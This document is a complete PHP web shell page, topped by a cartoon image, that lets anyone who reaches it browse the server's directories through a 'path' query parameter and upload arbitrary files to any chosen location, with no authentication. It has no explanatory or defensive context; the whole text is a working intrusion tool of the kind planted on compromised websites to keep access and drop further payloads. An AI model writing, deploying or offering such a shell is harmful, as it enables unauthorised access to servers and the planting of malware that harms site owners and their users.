<center>
<img src="https://www.pedestrian.tv/content/uploads/2019/01/rick-and-morty-clip-637x325.jpeg" >
<br><br>
<?php
$d = dir(".");
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);
 
foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";

if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo "<br>";
echo "_______________________________________________________________";
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="green">Upload win</font><br />';
}else{
echo '<font color="red">noooooooooo</font><br/>';
}
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="white">File Upload :</font> <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
echo "<br>";
echo "______________________________________________________";
echo "<br>";
if(isset($_GET['path']))
{
$actup = dir($_GET['path']);
while($entry = $actup->read()) {
   echo $entry."<br>\n";
}
$d->close();
}
else
{
while($entry = $d->read()) {
   echo $entry."<br>\n";
}
$d->close();
}
echo "<br>";
echo "________________";
?>
</center>
